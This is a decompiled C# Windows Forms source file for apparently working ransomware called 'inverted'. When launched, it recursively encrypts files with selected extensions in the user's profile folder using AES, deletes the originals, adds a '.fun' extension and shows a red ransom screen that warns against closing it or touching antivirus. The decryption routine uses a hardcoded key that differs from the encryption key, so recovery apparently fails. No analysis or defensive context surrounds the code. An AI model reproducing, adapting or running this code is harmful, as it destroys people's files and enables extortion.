using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Windows.Forms;
using Main;
using inverted.Properties;

namespace inverted;

public class Form1 : Form
{
	private static readonly string EncryptedFileListPath = Path.Combine(Config.WorkFolderPath, "EncryptedFileList.txt");

	private static readonly HashSet<string> EncryptedFiles = new HashSet<string>();

	private const string EncryptionFileExtension = ".fun";

	private const string EncryptionPassword = "OoIsAwwF32cICQoLDA0ODe==";

	private filelist moreForm;

	private IContainer components = null;

	private Label label1;

	private TextBox textBox1;

	private Button button1;

	private Button button2;

	private Label label3;

	internal static void EncryptFileSystem()
	{
		HashSet<string> extensionsToEncrypt = new HashSet<string>(GetExtensionsToEncrypt());
		CreateFileSystemSimulation();
		EncryptFiles("C:\\Users\\" + Environment.UserName + "\\", ".fun", extensionsToEncrypt);
		if (!File.Exists(EncryptedFileListPath))
		{
			string[] contents = EncryptedFiles.ToArray();
			File.WriteAllLines(EncryptedFileListPath, contents);
		}
	}

	internal static HashSet<string> GetEncryptedFiles()
	{
		HashSet<string> hashSet = new HashSet<string>();
		if (File.Exists(EncryptedFileListPath))
		{
			string[] array = File.ReadAllLines(EncryptedFileListPath);
			foreach (string item in array)
			{
				hashSet.Add(item);
			}
		}
		return hashSet;
	}

	private static string CreateFileSystemSimulation()
	{
		string text = Path.Combine(Config.WorkFolderPath, "FileSystemSimulation");
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		using (TextWriter textWriter = new StreamWriter(Path.Combine(text, "TxtTest.txt"), append: true))
		{
			textWriter.WriteLine("I am a txt test.");
		}
		using (TextWriter textWriter2 = new StreamWriter(Path.Combine(text, "NotTxtTest.nottxt"), append: true))
		{
			textWriter2.WriteLine("I am NOT a txt test.");
		}
		return text;
	}

	private static IEnumerable<string> GetExtensionsToEncrypt()
	{
		HashSet<string> hashSet = new HashSet<string>();
		foreach (string item in Resources.ExtensionsToEncrypt.Split(new string[2]
		{
			Environment.NewLine,
			" "
		}, StringSplitOptions.RemoveEmptyEntries).ToList())
		{
			hashSet.Add(item.Trim());
		}
		hashSet.Remove(".fun");
		return hashSet;
	}

	private static IEnumerable<string> GetFiles(string path)
	{
		Queue<string> queue = new Queue<string>();
		queue.Enqueue(path);
		while (queue.Count > 0)
		{
			path = queue.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string subDir in directories)
				{
					queue.Enqueue(subDir);
				}
			}
			catch (Exception ex2)
			{
				Console.Error.WriteLine(ex2);
			}
			string[] files = null;
			try
			{
				files = Directory.GetFiles(path);
			}
			catch (Exception ex)
			{
				Console.Error.WriteLine(ex);
			}
			if (files != null)
			{
				string[] array = files;
				for (int j = 0; j < array.Length; j++)
				{
					yield return array[j];
				}
			}
		}
	}

	private static void EncryptFiles(string dirPath, string encryptionExtension, HashSet<string> extensionsToEncrypt)
	{
		foreach (string item in from file in GetFiles(dirPath)
			from ext in extensionsToEncrypt
			where file.EndsWith(ext)
			select file into file
			select new
			{
				file = file,
				fi = new FileInfo(file)
			} into t
			where t.fi.Length < 10000000L
			select t.file)
		{
			try
			{
				if (EncryptFile(item, encryptionExtension))
				{
					EncryptedFiles.Add(item);
				}
			}
			catch
			{
			}
		}
	}

	internal static void DecryptFiles(string encryptionExtension)
	{
		foreach (string encryptedFile in GetEncryptedFiles())
		{
			try
			{
				string path = encryptedFile + encryptionExtension;
				DecryptFile(path, encryptionExtension);
				File.Delete(path);
			}
			catch
			{
			}
		}
		File.Delete(EncryptedFileListPath);
	}

	private static bool EncryptFile(string path, string encryptionExtension)
	{
		try
		{
			if (Config.StartMode != 0 && (path.StartsWith(Config.WorkFolderPath, StringComparison.InvariantCulture) || path.StartsWith("C:\\Windows", StringComparison.InvariantCultureIgnoreCase)))
			{
				return false;
			}
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			Guid guid = Guid.NewGuid();
			byte[] key = guid.ToByteArray();
			File.WriteAllText("C:\\Users\\" + Environment.UserName + "\\hidden.txt", guid.ToString());
			aesCryptoServiceProvider.Key = key;
			aesCryptoServiceProvider.IV = new byte[16]
			{
				0, 1, 0, 3, 5, 3, 0, 1, 0, 0,
				2, 0, 6, 7, 6, 0
			};
			EncryptFile(aesCryptoServiceProvider, path, path + encryptionExtension);
		}
		catch
		{
			return false;
		}
		try
		{
			File.Delete(path);
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}

	private static void DecryptFile(string path, string encryptionExtension)
	{
		try
		{
			if (!path.EndsWith(encryptionExtension))
			{
				return;
			}
			string outputFile = path.Remove(path.Length - 4);
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.Key = Convert.FromBase64String("OoIsAwwF32cICQoLDA0ODe==");
			aesCryptoServiceProvider.IV = new byte[16]
			{
				0, 1, 0, 3, 5, 3, 0, 1, 0, 0,
				2, 0, 6, 7, 6, 0
			};
			DecryptFile(aesCryptoServiceProvider, path, outputFile);
		}
		catch
		{
			return;
		}
		try
		{
			File.Delete(path);
		}
		catch (Exception)
		{
		}
	}

	private static void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
	{
		byte[] array = new byte[65536];
		using FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		using FileStream stream = new FileStream(outputFile, FileMode.Create);
		using CryptoStream cryptoStream = new CryptoStream(stream, alg.CreateEncryptor(), CryptoStreamMode.Write);
		int num;
		do
		{
			num = fileStream.Read(array, 0, array.Length);
			if (num != 0)
			{
				cryptoStream.Write(array, 0, num);
			}
		}
		while (num != 0);
	}

	private static void DecryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
	{
		byte[] array = new byte[65536];
		using FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		using FileStream stream = new FileStream(outputFile, FileMode.Create);
		using CryptoStream cryptoStream = new CryptoStream(stream, alg.CreateDecryptor(), CryptoStreamMode.Write);
		int num;
		do
		{
			num = fileStream.Read(array, 0, array.Length);
			if (num != 0)
			{
				cryptoStream.Write(array, 0, num);
			}
		}
		while (num != 0);
	}

	public Form1()
	{
		if (!File.Exists("C:\\Users\\" + Environment.UserName + "\\hidden.txt"))
		{
			EncryptFileSystem();
		}
		InitializeComponent();
	}

	public void onbuttonclick(object sender, EventArgs e)
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == "")
		{
			MessageBox.Show("INCORRECT");
		}
		else if (File.ReadAllText("C:\\Users\\" + Environment.UserName + "\\hidden.txt").Contains(((Control)textBox1).get_Text()))
		{
			MessageBox.Show("Correct");
			((Control)button1).set_Text("Decryption in progress..");
			((Control)button1).set_Enabled(false);
			((Control)button1).set_ForeColor(Color.Green);
			DecryptFiles(".fun");
			Environment.Exit(0);
		}
		else
		{
			MessageBox.Show("INCORRECT");
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	private void getfile(object sender, EventArgs e)
	{
		if (File.Exists("C:\\Users\\" + Environment.UserName + "\\Desktop\\list.txt"))
		{
			moreForm = new filelist();
			((Control)moreForm).Show();
			return;
		}
		using (StreamWriter streamWriter = new StreamWriter("C:\\Users\\" + Environment.UserName + "\\Desktop\\list.txt"))
		{
			foreach (string encryptedFile in GetEncryptedFiles())
			{
				streamWriter.WriteLine(encryptedFile);
			}
		}
		File.SetAttributes("C:\\Users\\" + Environment.UserName + "\\Desktop\\list.txt", FileAttributes.Hidden);
		moreForm = new filelist();
		((Control)moreForm).Show();
	}

	private void textBox2_TextChanged(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Expected O, but got Unknown
		//IL_0249: Unknown result type (might be due to invalid IL or missing references)
		//IL_0253: Expected O, but got Unknown
		label1 = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		button2 = new Button();
		label3 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Myanmar Text", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(SystemColors.ButtonFace);
		((Control)label1).set_Location(new Point(136, 28));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(541, 27));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("OOPS! ALL YOUR FILES HAS BEEN ENCRYPTED BY INVERT RANSOMEWARE");
		((Control)textBox1).set_Location(new Point(141, 285));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(327, 20));
		((Control)textBox1).set_TabIndex(1);
		((Control)button1).set_BackColor(Color.White);
		((Control)button1).set_Location(new Point(474, 282));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(2);
		((Control)button1).set_Text("Decrypt");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)onbuttonclick);
		((Control)button2).set_Location(new Point(141, 311));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(408, 36));
		((Control)button2).set_TabIndex(3);
		((Control)button2).set_Text("SHOW ME THE ENCRYPTED FILES LIST");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)getfile);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Myanmar Text", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(SystemColors.ButtonFace);
		((Control)label3).set_Location(new Point(136, 111));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(391, 108));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("Dont try to kill or off the window this will loose all \r\nyour files\r\nDont turn on/off the antivirus this will loose your files\r\nDont Shutdown this will lose your Files\r\n");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Red);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
